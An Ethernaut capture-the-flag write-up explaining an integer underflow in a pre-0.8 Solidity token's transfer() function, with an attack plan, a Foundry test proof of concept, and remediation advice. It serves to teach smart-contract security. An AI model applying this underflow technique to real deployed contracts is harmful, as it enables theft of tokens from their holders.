# Level 5 - Token

## Objectives

- You are given 20 tokens. Use them to gain additional tokens. Preferably a very large amount of tokens.

## Contract Overview

The `Token` contract is a simplified version of the ERC20 standard. It has 2 out
of 6 core ERC20 functions (`transfer()` and `balanceOf()`). It does not have the
mechanism of approval/spending of someone else's tokens. It also does not emit
`Transfer` and `Approval` events, which are necessary for the ERC20
specification. The `Token` contract lacks important safety checks to prevent
some of the most common ERC20 vulnerabilities.
_References: https://ethereum.org/en/developers/docs/standards/tokens/erc-20/, https://eips.ethereum.org/EIPS/eip-20_

Other than that, the `Token` contract is functioning almost the same as the
ERC20.

In the `Token` contract what interest us is `transfer()` function. This function is responsible for the transfer of tokens and accepts an address to which to send the tokens and a value specifying how many tokens to send.

```solidity
  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }
```

The first line has a validation that checks if sender balance does not go negative when we transfer the tokens. It should always be `>=0`.

The second line deducts the value from our balance.

The third line adds the token value to the balance of the receiver (`_to`).

## Static analysis (slither)

Here are the logs from the slither:

![alt text](https://github.com/matrix-0wl/ethernaut-solutions-foundry/blob/master/img/Token_slither.png)

## Finding the weak spots

The contract's Solidity version is <0.8 which means that it is prone to overflows and underflows.
_Reference: https://solidity-by-example.org/hacks/overflow/_

Integer Overflow is a scenario where the unsigned variable types reach their maximum capacity. When it can't hold anymore, it just resets back to its initial minimum point which was 0. The opposite goes for underflows. In the case of underflow, if we subtract 1 from a uint8 that is 0, it will change the value to 255.

To exploit `Token` contract we have to underflow the token balance. The vulnerability lies in the second line which is deducting our balance.

```solidity
  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0); // <-- this line over here
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }
```

In older versions of Solidity, there was no validation for overflows and underflows therefore developers had to implement their own checks. A SafeMath library was also introduced for this purpose. But since Solidity 0.8.0+, there's no need to use the SafeMath since it natively checks the variables for overflows and underflows and reverts if detected.

Since the objective of the level is for us to acquire some tokens, we'll have to exploit the following statements

```solidity
    require(balances[msg.sender] - _value >= 0); // <-- this line over here
    balances[msg.sender] -= _value;
```

In the case we not specify `uint` and left it as `uint` in fact it is `uint256` so the max value is `2^256 - 1`. `Uint` doesn't have negative number so if we transfer 21 tokens (having 20 tokens to start with) it would be `-1` but in this case it would be `2^256 - 1` so a very big number.

## Potential attack scenario (hypothesis)

If attacker transfers 21 tokens (having 20 tokens to start with) to some random contract address, he can exploit integer underflow to gain additional tokens (a very large amount of tokens).

## Plan of the attack

Attacker is given 20 tokens to start with.

1.  Attacker looks for random contract address (e.g. from https://etherscan.io/).
2.  Attacker calls `transfer()` passing random contract address as the first argument and any number larger than the number of tokens that attacker possesses (e.g. 21).
3.  Attacker gains additional tokens.

## Proof of Concept

Here is a simplified version of the unit test exploiting the vulnerability ([complete version here](https://github.com/matrix-0wl/ethernaut-solutions-foundry/blob/master/test/05-Token.t.sol))

```solidity
        // Attacker looks for random contract address (e.g. from https://etherscan.io/).
        address randomContractAddress = 0xBaF6dC2E647aeb6F510f9e318856A1BCd66C5e19;

        emit log_named_uint(
            "Attackers's balance of tokens (before attack): ",
            tokenContract.balanceOf(attacker)
        );

        // Attacker calls `transfer()` passing random contract address as the first argument and any number larger than the number of tokens that attacker possesses
        emit log_string("Starting the exploit...");
        tokenContract.transfer(randomContractAddress, 21);

        // Attacker gains additional tokens
        tokenContract.balanceOf(attacker);

        emit log_named_uint(
            "Attackers's balance of tokens (after attack): ",
            tokenContract.balanceOf(attacker)
        );

        // Test assertion
        assertGe(tokenContract.balanceOf(attacker), 20);
```

Here are the logs from the exploit contract:

![alt text](https://github.com/matrix-0wl/ethernaut-solutions-foundry/blob/master/img/Token.png)

## Recommendations

- For Solidity versions < 0.8.0 the use of SafeMath is recommended
- It is important to have 0 address checks to prevent token burning if it is not
  intended by design.
- Fuzz tests may catch unexpected logic bugs early. It is recommended to have at
  least one fuzz test per function (ex. tools: Echidna, Foundry fuzz tests,
  Mythril, Scribble)
- Make sure that all of the return values are checked. It is safer to have
  functions revert on failure rather than returning a boolean.
- State variables that do not change should be declared `constant`.

## Additional information

You can also read my other solution (using console) on my blog: https://matrix-0wl.gitbook.io/ethernaut/5.-token-uint-prone-to-under-overflow-in-solidity-less-than-0.8

## References

- [Blog Aditya Dixit](https://blog.dixitaditya.com/series/ethernaut)
- [D-Squared YT - Ethernaut CTF Series](https://www.youtube.com/watch?v=_ylKN2R_o-Y&list=PLiAoBT74VLnmRIPZGg4F36fH3BjQ5fLnz)
- [Mastering Ethereum book](https://github.com/ethereumbook/ethereumbook)
- [ChmielewskiKamil](https://github.com/ChmielewskiKamil/ethernaut-foundry)
- https://ethereum.org/en/developers/docs/standards/tokens/erc-20/
- https://eips.ethereum.org/EIPS/eip-20_
- https://solidity-by-example.org/hacks/overflow/

## Acknowledgements

The structure of my reports is based on the insights provided by:

- [ChmielewskiKamil](https://github.com/ChmielewskiKamil/ethernaut-foundry)
- [Joran Honig Twitter thread](https://twitter.com/joranhonig/status/1539578735631949825?s=20&t=Kp6iDNXfRKQUBbsb_Yj5SQ)

The recommendations section is based on the insights provided by:

- [ChmielewskiKamil](https://github.com/ChmielewskiKamil/ethernaut-foundry)
